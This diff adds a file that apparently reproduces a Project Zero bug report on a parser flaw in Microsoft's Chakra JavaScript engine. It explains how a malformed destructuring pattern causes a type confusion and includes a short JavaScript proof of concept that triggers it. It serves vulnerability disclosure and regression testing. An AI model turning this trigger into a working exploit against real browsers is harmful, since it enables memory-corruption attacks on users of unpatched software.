@@ -1,0 +1,22 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1308
+
+When the Chakra's parser meets "{", at first, Chakra treats it as an object literal without distinguishing whether it will be an object literal(i.e., {a: 0x1234}) or an object pattern(i.e., {a} = {a: 1234}). After finishing to parse it using "Parser::ParseTerm", if it's an object pattern, Chakra converts it to an object pattern using the "ConvertObjectToObjectPattern" method.
+
+The problem is that "Parser::ParseTerm" also parses ".", etc. using "ParsePostfixOperators" without proper checks. As a result, an invalid syntax(i.e., {b = 0x1111...}.c) can be parsed and "ConvertObjectToObjectPattern" will fail to convert it to an object pattern.
+
+In the following PoC, "ConvertObjectToObjectPattern" skips "{b = 0x1111...}.c". So the object literal will have incorrect members(b = 0x1111, c = 0x2222), this leads to type confusion(Chakra will think "c" is a setter and try to call it).
+
+PoC:
+-->
+
+function f() {
+    ({
+        a: {
+            b = 0x1111,
+            c = 0x2222,
+        }.c = 0x3333
+    } = {});
+}
+
+f();
